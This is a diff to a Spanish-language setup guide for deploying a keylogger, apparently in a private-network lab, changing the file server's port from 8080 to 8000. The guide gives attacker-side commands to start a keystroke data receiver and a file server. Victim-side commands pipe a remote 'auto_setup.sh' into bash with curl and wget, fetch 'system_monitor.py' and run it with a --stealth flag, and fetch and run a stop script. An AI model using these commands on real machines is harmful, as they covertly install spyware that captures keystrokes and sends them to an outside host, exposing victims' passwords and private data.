@@ -5,36 +5,41 @@
 - Máquina atacante (receptor): 10.0.2.15
 - Máquina víctima (objetivo): 10.0.2.4
 
+## PUERTOS UTILIZADOS:
+- Puerto 8080: Receptor de datos del keylogger
+- Puerto 8000: Servidor HTTP para descargar archivos
+⚠️  Los dos servicios usan puertos diferentes para evitar conflictos
+
 ## COMANDOS PARA MÁQUINA ATACANTE (10.0.2.15)
 # ==============================================
 
-# 1. Iniciar servidor receptor
+# 1. Iniciar servidor receptor (puerto 8080)
 python3 data_receiver.py --port 8080
 
-# 2. Servir archivos para descargar
-python3 -m http.server 8080
+# 2. Servir archivos para descargar (puerto 8000)
+python3 -m http.server 8000
 
 ## COMANDOS PARA MÁQUINA VÍCTIMA (10.0.2.4)
 # ==========================================
 
 # Opción 1: Instalación automática (RECOMENDADA)
-curl -s http://10.0.2.15:8080/auto_setup.sh | bash
+curl -s http://10.0.2.15:8000/auto_setup.sh | bash
 
 # Opción 2: Instalación manual silenciosa
-wget -q -O - http://10.0.2.15:8080/auto_setup.sh | bash
+wget -q -O - http://10.0.2.15:8000/auto_setup.sh | bash
 
 # Opción 3: Descarga y ejecución manual
-wget http://10.0.2.15:8080/system_monitor.py
+wget http://10.0.2.15:8000/system_monitor.py
 python3 system_monitor.py --stealth
 
 # Opción 4: Descargar proyecto completo
-wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8080/
+wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8000/
 
 ## COMANDOS DE CONTROL
 # ====================
 
 # Detener monitoreo desde máquina víctima
-curl -s http://10.0.2.15:8080/stop_monitor.sh | bash
+curl -s http://10.0.2.15:8000/stop_monitor.sh | bash
 
 # O ejecutar stop_monitor.sh localmente si lo tienes descargado
 ./stop_monitor.sh --cleanup
@@ -44,7 +49,7 @@ curl -s http://10.0.2.15:8080/stop_monitor.sh | bash
 
 # Desde víctima (10.0.2.4), verificar conexión al atacante:
 ping 10.0.2.15
-curl -I http://10.0.2.15:8080
+curl -I http://10.0.2.15:8000
 
 # Desde atacante (10.0.2.15), verificar conexión a víctima:
 ping 10.0.2.4
